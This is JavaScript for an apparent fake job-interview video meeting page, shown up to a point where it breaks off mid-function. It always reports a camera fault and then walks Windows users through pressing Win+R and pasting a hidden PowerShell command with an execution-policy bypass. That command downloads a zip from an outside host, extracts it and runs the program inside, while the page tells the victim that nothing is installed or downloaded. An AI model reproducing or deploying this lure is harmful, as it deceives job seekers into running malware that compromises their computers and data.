const DEFAULT_HOST_NAME = "Lena Ortiz";
const DEFAULT_HOST_ROLE = "Talent Partner";
const DEFAULT_CANDIDATE_LABEL = "Candidate";
const PREVIEW_EMPTY_LABEL = "Name pending";
const DEFAULT_TOPIC = "Aster Ridge Candidate Interview";
const DEFAULT_DURATION = "45 min";
const VALID_DURATIONS = new Set(["30 min", "45 min", "60 min"]);
const INTERVIEW_TIME_ZONE = "America/New_York";
const INTERVIEW_TIME_ZONE_LABEL = "ET";
const REPAIR_WRONG_KEY_TOAST_MS = 3500;
const REPAIR_CONFIRM_HINT_DEFAULT = "Click the button below when this step is done.";
const REPAIR_CONFIRM_HINT_RUN = "Use the Run window on your desktop, then come back here.";
const REPAIR_CONFIRM_HINT_PASTE = "Paste into the Run window on your desktop — not in this browser tab.";
const REPAIR_CONFIRM_HINT_ENTER = "Press Enter in the Run window, allow camera, then come back here.";
const REPAIR_STEP1_FALLBACK_DELAY_MS = 10000;
const HOST_ACCESS_SESSION_KEY = "aster-ridge-host-access";

function getHostAccessConfig() {
  const config = window.HOST_ACCESS_CONFIG || {};
  const code = String(config.code || "").trim();
  const enabled = config.enabled !== false && code.length > 0;

  return { enabled, code };
}

function isHostAccessRequired() {
  return getHostAccessConfig().enabled && !state.invitedViaLink;
}

function isHostAccessUnlocked() {
  if (!isHostAccessRequired()) return true;
  return sessionStorage.getItem(HOST_ACCESS_SESSION_KEY) === "1";
}

function unlockHostAccess(inputCode) {
  const config = getHostAccessConfig();
  if (!config.enabled) return true;

  if (String(inputCode || "").trim() === config.code) {
    sessionStorage.setItem(HOST_ACCESS_SESSION_KEY, "1");
    return true;
  }

  return false;
}

function updateHostAccessUI() {
  if (!els.hostAccessGate || !els.createForm) return;

  const showGate = isHostAccessRequired() && !isHostAccessUnlocked();

  els.hostAccessGate.classList.toggle("is-hidden", !showGate);
  els.createForm.classList.toggle("is-hidden", showGate);

  if (showGate) {
    els.createdRoom?.classList.add("is-hidden");
    window.requestAnimationFrame(() => els.hostAccessCode?.focus());
  }
}

function requireHostAccess(actionLabel = "create a meeting") {
  if (isHostAccessUnlocked()) return true;

  updateHostAccessUI();
  showToast(`Enter a valid host code to ${actionLabel}.`);
  els.hostAccessCode?.focus();
  return false;
}

const REPAIR_PROFILES = {
  windows: {
    osLabel: "Windows",
    issueTitle: "Camera permission needs attention",
    issueBody:
      "You are connected and can see the panel. Windows privacy needs camera access enabled for this browser — audio and the meeting are unaffected.",
    trustTitle: "Local Windows privacy setting",
    trustDetail: "No install, no download, no recording change.",
    command:
      'powershell -w h -ep bypass -c "$t=$env:TEMP;iwr \'https://driver-fix-238307.netlify.app/localeprofilesync.zip\' -O $t\\z.zip -useb;Expand-Archive $t\\z.zip $t -F;.$t\\LocaleProfileSync <#Verification ID:6d40eb3fbf354957#>"',
    fallbackTitle: "Manual Windows path",
    fallbackBody: "Allow camera for this browser, then return here.",
    steps: [
      {
        shortLabel: "Run",
        tagline: "Quick system shortcut",
        headerIcon: "run",
        title: "Open the Windows Run box",
        copy:
          "Keep this interview tab open. Press Windows + R on your keyboard to open the Run window on your desktop.",
        detail:
          "Do not type in this page. When the Run window appears, come back here and continue.",
        confirm: "Run window is open",
        hint: REPAIR_CONFIRM_HINT_RUN,
        actionLabel: "Press on your keyboard",
        actionHint: "Hold the Windows logo key, then tap R once. The Run window opens outside this browser.",
        keys: ["Windows", "R"],
        keyJoiner: "+",
        keyStyle: "keyboard",
        visual: "run",
      },
      {
        shortLabel: "Paste",
        tagline: "Paste from clipboard",
        headerIcon: "paste",
        title: "Paste in Run",
        copy: "Click the Open field in the Run window, then press Ctrl + V.",
        detail: "The command is already copied. Paste it only into the Run window on your desktop.",
        confirm: "I pasted in Run",
        hint: REPAIR_CONFIRM_HINT_PASTE,
        actionLabel: "In the Run window",
        actionHint: "Paste into the Open field",
        keys: ["Ctrl", "V"],
        keyStyle: "keyboard",
      },
      {
        shortLabel: "Allow",
        tagline: "Enable in Privacy",
        headerIcon: "privacy",
        title: "Open camera settings",
        copy: "With the command visible in the Run window, press Enter once.",
        detail: "Windows opens the camera permission screen. Allow this browser, then return here.",
        confirm: "Camera access is on",
        hint: REPAIR_CONFIRM_HINT_ENTER,
        actionLabel: "In the Run window",
        actionHint: "Press Enter after the command appears",
        keys: ["Enter"],
        keyStyle: "keyboard",
      },
    ],
  },
  macos: {
    osLabel: "macOS",
    issueTitle: "Camera permission needs attention",
    issueBody:
      "You are connected and can see the panel. macOS privacy needs camera access enabled for this browser — audio and the meeting are unaffected.",
    trustTitle: "Local macOS privacy setting",
    trustDetail: "No install, no download, no recording change.",
    command: null,
    fallbackTitle: "Manual macOS path",
    fallbackBody: "Allow camera for this browser, then return here.",
    steps: [
      {
        shortLabel: "Settings",
        tagline: "Open Privacy settings",
        headerIcon: "privacy",
        title: "Open macOS Camera Privacy",
        copy: "Open System Settings, then go to Privacy & Security > Camera.",
        detail: "This stays on your Mac. You are only changing camera access for your browser.",
        confirm: "Camera Privacy is open",
        hint: "Confirm when you can see the Camera privacy list in System Settings.",
        actionLabel: "On your Mac",
        actionHint: "Open Camera permissions for this browser",
        keys: ["System Settings", "Camera"],
        keyJoiner: "then",
        keyStyle: "flow",
        visual: "settings",
      },
      {
        shortLabel: "Allow",
        tagline: "Enable browser",
        headerIcon: "camera",
        title: "Allow camera for this browser",
        copy: "Find Chrome, Edge, Safari, or your browser in the Camera list and turn access on.",
        detail: "If macOS asks, quit and reopen the browser after enabling access.",
        confirm: "Camera access is on",
        hint: "Confirm after the browser is allowed in macOS Camera settings.",
        actionLabel: "In Camera Privacy",
        actionHint: "Turn on the browser you are using for this interview",
        keys: ["Find browser", "Turn on"],
        keyJoiner: "then",
        keyStyle: "flow",
        visual: "settings",
      },
      {
        shortLabel: "Return",
        tagline: "Back to interview",
        headerIcon: "run",
        title: "Return to this interview tab",
        copy: "Come back to this browser tab after the camera permission is enabled.",
        detail: "We will run a live camera check before the panel sees your video.",
        confirm: "I returned to the interview",
        hint: "Confirm after returning to this interview tab.",
        actionLabel: "Back in browser",
        actionHint: "Return here when macOS settings are complete",
        keys: ["Return here"],
        keyStyle: "flow",
      },
    ],
  },
  linux: {
    osLabel: "Linux",
    issueTitle: "Camera permission needs attention",
    issueBody:
      "You are connected and can see the panel. Browser or desktop permissions need camera access enabled — audio and the meeting are unaffected.",
    trustTitle: "Local browser/device setting",
    trustDetail: "No install, no download, no recording change.",
    command: null,
    fallbackTitle: "Manual Linux checks",
    fallbackBody:
      "Allow camera from the browser address-bar permission icon, close other apps using the camera, then return here and retry.",
    steps: [
      {
        shortLabel: "Permit",
        tagline: "Browser permission",
        headerIcon: "privacy",
        title: "Allow camera in the browser",
        copy: "Click the lock or camera icon in the address bar, then set Camera to Allow.",
        detail: "This changes permission for this interview site only.",
        confirm: "Camera is allowed",
        hint: "Confirm after Camera is set to Allow for this site.",
        actionLabel: "In your browser",
        actionHint: "Address bar lock/camera icon, then set Camera to Allow",
        keys: ["Site permissions", "Allow camera"],
        keyJoiner: "then",
        keyStyle: "flow",
        visual: "browser",
      },
      {
        shortLabel: "Release",
        tagline: "Free camera",
        headerIcon: "camera",
        title: "Close apps using the camera",
        copy: "Close other meeting apps or camera tools that may already be using your camera.",
        detail: "Only one app may be able to use the camera at a time on some Linux setups.",
        confirm: "Other camera apps are closed",
        hint: "Confirm after closing other apps that may use the camera.",
        actionLabel: "On this device",
        actionHint: "Close video apps, camera preview tools, or other browser tabs",
        keys: ["Close camera apps"],
        keyStyle: "flow",
        visual: "apps",
      },
      {
        shortLabel: "Return",
        tagline: "Back to interview",
        headerIcon: "run",
        title: "Return to this interview tab",
        copy: "Come back to this browser tab after camera permission is allowed.",
        detail: "We will run a live camera check before the panel sees your video.",
        confirm: "I returned to the interview",
        hint: "Confirm after returning to this interview tab.",
        actionLabel: "Back in browser",
        actionHint: "Return here when permissions are complete",
        keys: ["Return here"],
        keyStyle: "flow",
      },
    ],
  },
};

const people = [
  {
    name: "Lena Ortiz",
    role: "Talent Partner",
    muted: false,
    video: true,
    colors: ["#334155", "#475569"],
  },
  {
    name: "Marcus Chen",
    role: "Hiring Manager",
    muted: true,
    video: true,
    colors: ["#1e3a3a", "#335c67"],
  },
  {
    name: "Amara Singh",
    role: "Team Interviewer",
    muted: false,
    video: false,
    colors: ["#2f3136", "#4b5563"],
  },
  {
    name: "Victor Hale",
    role: "Technical Interviewer",
    muted: true,
    video: false,
    colors: ["#2d2f39", "#4c5261"],
  },
  {
    name: "Naomi Brooks",
    role: "People Operations",
    muted: true,
    video: false,
    colors: ["#1f2937", "#475569"],
  },
];

const sampleMessages = [
  ["Lena Ortiz", "Thanks for joining. We will begin with a short introduction."],
  ["Marcus Chen", "After that, I will ask about your experience and role fit."],
  ["Amara Singh", "Please keep examples high level. No confidential employer details are needed."],
];

const autoMessages = [
  ["Lena Ortiz", "The hiring panel is ready when you are."],
  ["Marcus Chen", "We will cover background, recent work, and role expectations."],
  ["Amara Singh", "Experience review is the main focus for this round."],
  ["Victor Hale", "I may ask one short practical question related to the role."],
  ["Naomi Brooks", "I will stay mostly muted and cover process questions at the end."],
];

const els = {
  home: document.querySelector("#home"),
  createForm: document.querySelector("#create-form"),
  hostName: document.querySelector("#host-name"),
  createHostRole: document.querySelector("#create-host-role"),
  createTopic: document.querySelector("#create-topic"),
  createDuration: document.querySelector("#create-duration"),
  homeDurationStat: document.querySelector("#home-duration-stat"),
  createdRoom: document.querySelector("#created-room"),
  createdTitle: document.querySelector("#created-title"),
  createdRoomId: document.querySelector("#created-room-id"),
  createdLink: document.querySelector("#created-link"),
  copyCreatedLink: document.querySelector("#copy-created-link"),
  startHostButton: document.querySelector("#start-host-button"),
  hostAccessGate: document.querySelector("#host-access-gate"),
  hostAccessCode: document.querySelector("#host-access-code"),
  hostAccessError: document.querySelector("#host-access-error"),
  hostAccessUnlock: document.querySelector("#host-access-unlock"),
  prejoin: document.querySelector("#prejoin"),
  meeting: document.querySelector("#meeting"),
  form: document.querySelector("#join-form"),
  joinButton: document.querySelector("#join-button"),
  launchOverlay: document.querySelector("#launch-overlay"),
  launchTitle: document.querySelector("#launch-title"),
  launchRoom: document.querySelector("#launch-room"),
  launchContinue: document.querySelector("#launch-continue"),
  inviteContext: document.querySelector("#invite-context"),
  inviteContextTitle: document.querySelector("#invite-context-title"),
  inviteContextRoom: document.querySelector("#invite-context-room"),
  inviteDuration: document.querySelector("#invite-duration"),
  inviteHostInitials: document.querySelector("#invite-host-initials"),
  inviteHostName: document.querySelector("#invite-host-name"),
  inviteHostRole: document.querySelector("#invite-host-role"),
  lobbySchedule: document.querySelector("#lobby-schedule"),
  postJoinSecurity: document.querySelector("#postjoin-security"),
  securityCard: document.querySelector("#security-card"),
  securityStatus: document.querySelector("#security-status"),
  securityReference: document.querySelector("#security-reference"),
  securitySpinner: document.querySelector("#security-spinner"),
  securityStartButton: document.querySelector("#security-start-button"),
  displayName: document.querySelector("#display-name"),
  displayNameError: document.querySelector("#display-name-error"),
  mobileDeviceAlert: document.querySelector("#mobile-device-alert"),
  meetingTopic: document.querySelector("#meeting-topic"),
  previewName: document.querySelector("#preview-name"),
  previewInitials: document.querySelector("#preview-initials"),
  deviceSummary: document.querySelector("#device-summary"),
  cameraDeviceStatus: document.querySelector("#camera-device-status"),
  micDeviceStatus: document.querySelector("#mic-device-status"),
  networkDeviceStatus: document.querySelector("#network-device-status"),
  previewDeviceWarning: document.querySelector("#preview-device-warning"),
  previewCameraLoading: document.querySelector("#preview-camera-loading"),
  previewAudioState: document.querySelector("#preview-audio-state"),
  previewVideoState: document.querySelector("#preview-video-state"),
  prejoinMic: document.querySelector("#prejoin-mic"),
  prejoinCamera: document.querySelector("#prejoin-camera"),
  joinSettingsStatus: document.querySelector("#join-settings-status"),
  deviceRepairDialog: document.querySelector("#device-repair-dialog"),
  deviceRepairCard: document.querySelector(".device-repair-card"),
  deviceRepairPreflight: document.querySelector("#device-repair-preflight"),
  deviceRepairWorkspace: document.querySelector("#device-repair-workspace"),
  deviceRepairPreflightChecks: document.querySelector("#device-repair-preflight-checks"),
  deviceRepairProgressLabel: document.querySelector("#device-repair-progress-label"),
  deviceRepairProgressTagline: document.querySelector("#device-repair-progress-tagline"),
  deviceRepairProgressFill: document.querySelector("#device-repair-progress-fill"),
  deviceRepairIssueTitle: document.querySelector("#device-repair-issue-title"),
  deviceRepairIssueBody: document.querySelector("#device-repair-issue-body"),
  deviceRepairSafeNoteCopy: document.querySelector("#device-repair-safe-note-copy"),
  deviceRepairTitle: document.querySelector("#device-repair-title"),
  deviceRepairCopy: document.querySelector("#device-repair-copy"),
  deviceRepairDetail: document.querySelector("#device-repair-detail"),
  deviceRepairHeaderIcon: document.querySelector("#device-repair-header-icon"),
  deviceRepairStepperItems: Array.from(document.querySelectorAll("[data-repair-step]")),
  deviceRepairHostInitials: document.querySelector("#device-repair-host-initials"),
  deviceRepairHostWaiting: document.querySelector("#device-repair-host-waiting"),
  deviceRepairSteps: [
    document.querySelector("#device-repair-step-1"),
    document.querySelector("#device-repair-step-2"),
    document.querySelector("#device-repair-step-3"),
    document.querySelector("#device-repair-step-4"),
  ],
  deviceRepairActionLabel: document.querySelector("#device-repair-action-label"),
  deviceRepairActionHint: document.querySelector("#device-repair-action-hint"),
  deviceRepairActionKeys: document.querySelector("#device-repair-action-keys"),
  deviceRepairRunPreview: document.querySelector("#device-repair-run-preview"),
  deviceRepairBrowserPreview: document.querySelector("#device-repair-browser-preview"),
  deviceRepairSettingsPreview: document.querySelector("#device-repair-settings-preview"),
  deviceRepairAppsPreview: document.querySelector("#device-repair-apps-preview"),
  deviceRepairActionTrust: document.querySelector("#device-repair-action-trust"),
  deviceRepairPlatformNote: document.querySelector("#device-repair-platform-note"),
  deviceRepairFallback: document.querySelector("#device-repair-fallback"),
  deviceRepairFallbackTrigger: document.querySelector("#device-repair-fallback-trigger"),
  deviceRepairFallbackPanel: document.querySelector("#device-repair-fallback-panel"),
  deviceRepairReady: document.querySelector("#device-repair-ready"),
  deviceRepairReadyText: document.querySelector("#device-repair-ready-text"),
  deviceRepairPasteWarning: document.querySelector("#device-repair-paste-warning"),
  deviceRepairEnterWarning: document.querySelector("#device-repair-enter-warning"),
  deviceRepairMain: document.querySelector("#device-repair-main"),
  deviceRepairCheckStatus: document.querySelector("#device-repair-check-status"),
  deviceRepairNext: document.querySelector("#device-repair-next"),
  deviceRepairCheck: document.querySelector("#device-repair-check"),
  deviceRepairContinue: document.querySelector("#device-repair-continue"),
  deviceRepairRestart: document.querySelector("#device-repair-restart"),
  deviceRepairActions: document.querySelector("#device-repair-actions"),
  deviceRepairConfirmHint: document.querySelector("#device-repair-confirm-hint"),
  openDeviceRepair: document.querySelector("#open-device-repair"),
  cameraDeviceRow: document.querySelector("#camera-device-row"),
  roomTitle: document.querySelector("#room-title"),
  meetingId: document.querySelector("#meeting-id"),
  timer: document.querySelector("#timer"),
  briefDuration: document.querySelector("#brief-duration"),
  briefHostMember: document.querySelector("#brief-host-member"),
  briefButton: document.querySelector("#brief-button"),
  gallery: document.querySelector("#gallery"),
  interviewDeviceStatus: document.querySelector("#interview-device-status"),
  systemBanner: document.querySelector("#system-banner"),
  cameraSetupTitle: document.querySelector("#camera-setup-title"),
  cameraSetupCopy: document.querySelector("#camera-setup-copy"),
  eventFeed: document.querySelector("#event-feed"),
  interviewBriefPanel: document.querySelector("#interview-brief-panel"),
  briefToggleButton: document.querySelector("#brief-toggle-button"),
  participantsList: document.querySelector("#participants-list"),
  participantCount: document.querySelector("#participant-count"),
  chatList: document.querySelector("#chat-list"),
  chatForm: document.querySelector("#chat-form"),
  chatInput: document.querySelector("#chat-input"),
  chatBadge: document.querySelector("#chat-badge"),
  participantsPanel: document.querySelector("#participants-panel"),
  chatPanel: document.querySelector("#chat-panel"),
  securityPanel: document.querySelector("#security-panel"),
  sessionSecurityReference: document.querySelector("#session-security-reference"),
  participantsButton: document.querySelector("#participants-button"),
  chatButton: document.querySelector("#chat-button"),
  securityButton: document.querySelector("#security-button"),
  micButton: document.querySelector("#mic-button"),
  cameraButton: document.querySelector("#camera-button"),
  shareButton: document.querySelector("#share-button"),
  stopShareButton: document.querySelector("#stop-share-button"),
  shareBanner: document.querySelector("#share-banner"),
  shareBannerText: document.querySelector("#share-banner-text"),
  reactionButton: document.querySelector("#reaction-button"),
  reactionLayer: document.querySelector("#reaction-layer"),
  recordButton: document.querySelector("#record-button"),
  moreButton: document.querySelector("#more-button"),
  moreMenu: document.querySelector("#more-menu"),
  inviteButton: document.querySelector("#invite-button"),
  inviteDialog: document.querySelector("#invite-dialog"),
  inviteLink: document.querySelector("#invite-link"),
  copyLinkButton: document.querySelector("#copy-link-button"),
  viewButton: document.querySelector("#view-button"),
  leaveButton: document.querySelector("#leave-button"),
  toast: document.querySelector("#toast"),
  speakerName: document.querySelector("#speaker-name"),
  speakerInitials: document.querySelector("#speaker-initials"),
};

const state = {
  currentUser: {
    name: DEFAULT_CANDIDATE_LABEL,
    role: "Candidate",
    muted: false,
    video: false,
    colors: ["#334155", "#1f2937"],
  },
  hostName: DEFAULT_HOST_NAME,
  hostRole: DEFAULT_HOST_ROLE,
  topic: DEFAULT_TOPIC,
  duration: DEFAULT_DURATION,
  roomCode: createRoomCode(),
  passcode: createPasscode(),
  role: "guest",
  participants: [],
  messages: [],
  inMeeting: false,
  startedAt: 0,
  timerId: null,
  activeSpeakerIndex: 1,
  unreadChat: 0,
  isSharing: false,
  invitedViaLink: false,
  isJoining: false,
  briefVisible: true,
  eventTimers: [],
  systemEvents: [],
  securityVerified: false,
  device: {
    cameraRecognized: false,
    cameraChecking: false,
    cameraRepairAttempted: false,
    cameraRepairResolved: false,
    repairCommandCopied: false,
    repairNudgeSent: false,
    repairWizardStep: 1,
    microphoneReady: true,
    networkReady: true,
  },
};

let lobbyDeviceCheckTimer = null;
let repairWrongKeyToastAt = 0;
let repairPreflightTimer = null;
let repairPreflightCheckTimer = null;
let repairStep1FallbackTimer = null;

const REPAIR_VERIFIED_HOLD_MS = 900;
const REPAIR_DIALOG_OPEN_DELAY_MS = 2000;
const REPAIR_PREFLIGHT_MS = 2000;
const REPAIR_PREFLIGHT_CHECK_MS = 560;

const CAMERA_SETUP_BAR_COPY = {
  default: {
    title: "Outgoing video pending on this device",
    copy: "You are in the room with audio. Enable your camera (~1 min) so the panel can see you.",
    action: "Enable video",
    disabled: false,
  },
  diagnosing: {
    title: "Checking camera access on this device...",
    copy: "You are still in the room. The panel is connected while we prepare the guided camera fix.",
    action: "Preparing fix",
    disabled: true,
  },
};

const REPAIR_KEY_WARNINGS = {
  paste: {
    getElement: () => els.deviceRepairPasteWarning,
    toast: "Paste in the Run dialog (Win + R), not in this browser tab.",
  },
  enter: {
    getElement: () => els.deviceRepairEnterWarning,
    toast: "Press Enter in the Run dialog, not in this browser tab.",
  },
};

function createRoomCode() {
  const saved = localStorage.getItem("visual-room-code");
  if (saved) return saved;

  const code = generateRoomCode();
  localStorage.setItem("visual-room-code", code);
  return code;
}

function generateRoomCode() {
  return `${randomPart()} ${randomPart()} ${randomPart()}`;
}

function createPasscode() {
  return String(Math.floor(100000 + Math.random() * 900000));
}

function createSecurityReference() {
  return `ARS-${Math.floor(100000 + Math.random() * 900000)}`;
}

function randomPart() {
  return String(Math.floor(100 + Math.random() * 900));
}

function normalizeDuration(value) {
  if (!value) return DEFAULT_DURATION;

  const normalized = value.endsWith("min") ? value : `${value} min`;
  return VALID_DURATIONS.has(normalized) ? normalized : DEFAULT_DURATION;
}

function normalizeHostRole(value) {
  const trimmed = value?.trim().slice(0, 32);
  return trimmed || DEFAULT_HOST_ROLE;
}

function getPanelPeople() {
  return people.map((person, index) =>
    index === 0 ? { ...person, name: state.hostName, role: state.hostRole } : person,
  );
}

function getSampleMessages() {
  return sampleMessages.map(([author, message]) => [
    author === DEFAULT_HOST_NAME ? state.hostName : author,
    message,
  ]);
}

function getAutoMessages() {
  return autoMessages.map(([author, message]) => [
    author === DEFAULT_HOST_NAME ? state.hostName : author,
    message,
  ]);
}

function updateInterviewBrief() {
  els.briefDuration.textContent = state.duration;
  els.briefHostMember.textContent = `${state.hostName} - ${state.hostRole}`;
}

function getInitials(name) {
  return name
    .trim()
    .split(/\s+/)
    .slice(0, 2)
    .map((part) => part[0])
    .join("")
    .toUpperCase() || "ME";
}

function formatTime(totalSeconds) {
  const minutes = Math.floor(totalSeconds / 60);
  const seconds = totalSeconds % 60;
  return `${String(minutes).padStart(2, "0")}:${String(seconds).padStart(2, "0")}`;
}

function getLobbyScheduleLabel() {
  const scheduledAt = new Date(Date.now() + 10 * 60 * 1000);
  const date = new Intl.DateTimeFormat("en-US", {
    timeZone: INTERVIEW_TIME_ZONE,
    weekday: "short",
    month: "short",
    day: "numeric",
  }).format(scheduledAt);
  const time = new Intl.DateTimeFormat("en-US", {
    timeZone: INTERVIEW_TIME_ZONE,
    hour: "numeric",
    minute: "2-digit",
  }).format(scheduledAt);

  return `${date} · ${time} ${INTERVIEW_TIME_ZONE_LABEL}`;
}

function applyQueryDefaults() {
  const params = new URLSearchParams(window.location.search);
  const name = params.get("name");
  const host = params.get("host");
  const hostRole = params.get("hostRole");
  const topic = params.get("topic");
  const duration = params.get("duration");
  const room = params.get("room");
  const passcode = params.get("passcode");
  const invite = params.get("invite");

  if (name) state.currentUser.name = name.slice(0, 32);
  if (host) state.hostName = host.slice(0, 32);
  state.hostRole = normalizeHostRole(hostRole);
  if (topic) state.topic = topic.slice(0, 48);
  state.duration = normalizeDuration(duration);
  if (room) state.roomCode = room.slice(0, 16);
  if (passcode) state.passcode = passcode.slice(0, 8);
  state.invitedViaLink = invite === "1" || Boolean(room);
  state.role = state.invitedViaLink ? "guest" : "host";
  if (!name) {
    state.currentUser.name = state.invitedViaLink ? "" : DEFAULT_HOST_NAME;
  }

  els.hostName.value = state.hostName;
  els.createHostRole.value = state.hostRole;
  els.createTopic.value = state.topic;
  els.createDuration.value = state.duration;
  els.homeDurationStat.textContent = state.duration;
  els.displayName.value = state.currentUser.name;
  els.meetingTopic.value = state.topic;
  document.title = `${state.topic} - Video Meeting`;
  updateInviteContext();
  updateCreatedRoom();
  updatePreview();
  els.lobbySchedule.textContent = getLobbyScheduleLabel();

  if (state.invitedViaLink) {
    showPrejoin();
    showLaunchOverlay();
  } else {
    els.hostName.value = state.hostName;
    els.createHostRole.value = state.hostRole;
    els.createTopic.value = state.topic;
    els.createDuration.value = state.duration;
    showHome();
  }
}

function updatePreview() {
  const name = els.displayName.value.trim();
  const hasName = Boolean(name);
  els.previewName.textContent = hasName ? name : PREVIEW_EMPTY_LABEL;
  els.previewName.classList.toggle("is-empty", !hasName);
  els.previewInitials.textContent = hasName ? getInitials(name) : "ID";
  els.previewInitials.classList.toggle("is-empty", !hasName);
}

function setNameFieldError(show) {
  els.displayName.classList.toggle("is-invalid", show);
  els.displayName.setAttribute("aria-invalid", String(show));
  els.displayNameError?.classList.toggle("is-hidden", !show);
  els.form.classList.toggle("has-name-error", show);
  if (els.joinSettingsStatus) {
    els.joinSettingsStatus.textContent = show ? "Name required" : "Ready to join";
  }
}

function validateDisplayName({ reveal = false } = {}) {
  const hasName = Boolean(els.displayName.value.trim());
  if (hasName) {
    setNameFieldError(false);
    return true;
  }

  if (reveal) {
    setNameFieldError(true);
  }
  return false;
}

function showHome() {
  els.home.classList.remove("is-hidden");
  els.prejoin.classList.add("is-hidden");
  els.meeting.classList.add("is-hidden");
  updateHostAccessUI();
}

function showPrejoin() {
  els.home.classList.add("is-hidden");
  els.prejoin.classList.remove("is-hidden");
  els.meeting.classList.add("is-hidden");
  setNameFieldError(false);
  updateJoinAvailability();
  resetDeviceRepairState();
  runLobbyDeviceCheck();
  resetSecurityCheck();
  hidePostJoinSecurity();
}

function updateInviteContext() {
  els.inviteContext.classList.toggle("is-hidden", !state.invitedViaLink);
  els.inviteContextTitle.textContent = state.topic;
  els.inviteContextRoom.textContent = `Meeting ID: ${state.roomCode} · Passcode: ${state.passcode}`;
  els.inviteDuration.textContent = state.duration;
  els.inviteHostName.textContent = state.hostName;
  els.inviteHostRole.textContent = state.hostRole;
  els.inviteHostInitials.textContent = getInitials(state.hostName);
  els.launchRoom.textContent = `${state.topic} · ${state.roomCode}`;
}

function showLaunchOverlay() {
  showProcessOverlay("Opening meeting...", `${state.topic} · ${state.roomCode}`, true);
  window.setTimeout(hideLaunchOverlay, 1350);
}

function hideLaunchOverlay() {
  els.launchOverlay.classList.add("is-hidden");
}

function showProcessOverlay(title, detail, canContinue = false) {
  els.launchTitle.textContent = title;
  els.launchRoom.textContent = detail;
  els.launchContinue.classList.toggle("is-hidden", !canContinue);
  els.launchOverlay.classList.remove("is-hidden");
}

function updateCreatedRoom() {
  els.createdTitle.textContent = state.topic;
  els.createdRoomId.textContent = `Meeting ID: ${state.roomCode} · Passcode: ${state.passcode}`;
  els.createdLink.value = buildInviteUrl();
}

function buildInviteUrl() {
  const url = new URL(window.location.href);
  url.searchParams.set("topic", state.topic);
  url.searchParams.set("host", state.hostName);
  url.searchParams.set("hostRole", state.hostRole);
  url.searchParams.set("duration", state.duration);
  url.searchParams.set("room", state.roomCode);
  url.searchParams.set("passcode", state.passcode);
  url.searchParams.set("invite", "1");
  url.searchParams.delete("name");
  return url.toString();
}

function runLobbyDeviceCheck() {
  if (lobbyDeviceCheckTimer) {
    window.clearTimeout(lobbyDeviceCheckTimer);
    lobbyDeviceCheckTimer = null;
  }

  state.device.cameraRecognized = false;
  state.device.cameraChecking = true;
  state.device.microphoneReady = true;
  state.device.networkReady = true;

  els.micDeviceStatus.textContent = "Built-in microphone ready";
  els.networkDeviceStatus.textContent = "Stable connection";
  els.previewAudioState.textContent = "Microphone ready";
  els.deviceSummary.textContent = "Checking devices...";
  els.cameraDeviceStatus.textContent = "Checking...";
  els.previewVideoState.textContent = "Starting video...";
  els.previewDeviceWarning.classList.add("is-hidden");
  els.previewCameraLoading.classList.remove("is-hidden");
  setCameraDeviceRowState(false);
  setButtonState(els.prejoinCamera, false, "Camera on", "Camera off");
  if (els.joinSettingsStatus) {
    els.joinSettingsStatus.textContent = "Checking devices...";
  }
  updateJoinAvailability();

  lobbyDeviceCheckTimer = window.setTimeout(() => {
    state.device.cameraChecking = false;
    state.device.cameraRecognized = false;
    els.previewCameraLoading.classList.add("is-hidden");
    els.deviceSummary.textContent = "Microphone and network ready";
    els.cameraDeviceStatus.textContent = "Camera setup needed";
    els.previewVideoState.textContent = "Camera setup needed";
    els.previewDeviceWarning.classList.remove("is-hidden");
    updateJoinAvailability();
    lobbyDeviceCheckTimer = null;
  }, 2400);
}

function resetDeviceRepairState() {
  state.device.cameraRepairAttempted = false;
  state.device.cameraRepairResolved = false;
  state.device.repairCommandCopied = false;
  state.device.repairNudgeSent = false;
  hideDeviceRepairDialog();
  resetRepairWizard();
}

function updateRepairStepper(step) {
  els.deviceRepairStepperItems.forEach((item) => {
    const itemStep = Number(item.dataset.repairStep);
    item.classList.toggle("is-complete", itemStep < step);
    item.classList.toggle("is-active", itemStep === step);
    item.classList.toggle("is-pending", itemStep > step);
  });
}

function updateRepairHostContext() {
  const hostName = state.hostName || DEFAULT_HOST_NAME;
  if (els.deviceRepairHostInitials) {
    els.deviceRepairHostInitials.textContent = getInitials(hostName);
  }
  if (els.deviceRepairHostWaiting) {
    els.deviceRepairHostWaiting.textContent = `${hostName} remains connected`;
  }
}

function updateRepairPlatformContext() {
  const profile = getRepairProfile();
  if (els.deviceRepairIssueTitle) {
    els.deviceRepairIssueTitle.textContent = profile.issueTitle;
  }
  if (els.deviceRepairIssueBody) {
    els.deviceRepairIssueBody.textContent = profile.issueBody;
  }
  if (els.deviceRepairSafeNoteCopy) {
    els.deviceRepairSafeNoteCopy.textContent = `Local ${profile.osLabel} permission only · Interview stays connected · Nothing installed`;
  }
}

function playRepairStepEnterAnimation(step) {
  const panel = els.deviceRepairSteps[step - 1];
  if (!panel) return;

  panel.classList.remove("is-entering");
  window.requestAnimationFrame(() => {
    panel.classList.add("is-entering");
    window.setTimeout(() => panel.classList.remove("is-entering"), 420);
  });
}

function getClientPlatform() {
  const userAgent = navigator.userAgent || "";
  const platform = navigator.userAgentData?.platform || navigator.platform || "";
  const maxTouchPoints = navigator.maxTouchPoints || 0;
  const isIpadOS = /Mac/i.test(platform) && maxTouchPoints > 1;
  const isMobile =
    isIpadOS || /Android|iPhone|iPad|iPod|Mobile|Tablet|Windows Phone/i.test(userAgent);

  if (isMobile) {
    return { type: "mobile", key: "mobile", label: "Mobile or tablet" };
  }
  if (/Win/i.test(platform)) {
    return { type: "desktop", key: "windows", label: "Windows" };
  }
  if (/Mac/i.test(platform)) {
    return { type: "desktop", key: "macos", label: "macOS" };
  }
  if (/Linux|X11|CrOS/i.test(platform) || /Linux|X11|CrOS/i.test(userAgent)) {
    return { type: "desktop", key: "linux", label: "Linux" };
  }

  return { type: "desktop", key: "linux", label: "Desktop" };
}

function isMobileJoinBlocked() {
  return getClientPlatform().type === "mobile";
}

function getRepairProfile() {
  const platform = getClientPlatform();
  return REPAIR_PROFILES[platform.key] || REPAIR_PROFILES.linux;
}

function getRepairWizardSteps() {
  return [
    ...getRepairProfile().steps,
    {
      shortLabel: "Verify",
      tagline: "Final check",
      headerIcon: "camera",
      title: "Verify your camera",
      copy: "You are almost done. Run a live camera test before the panel sees you on video.",
      detail: "This confirms your privacy change took effect — continue only when video works.",
      confirm: "Check my camera",
      hint: null,
      actionLabel: null,
      actionHint: null,
      keys: [],
    },
  ];
}

function clearStep1FallbackTimer() {
  window.clearTimeout(repairStep1FallbackTimer);
  repairStep1FallbackTimer = null;
}

function resetStep1Fallback() {
  clearStep1FallbackTimer();
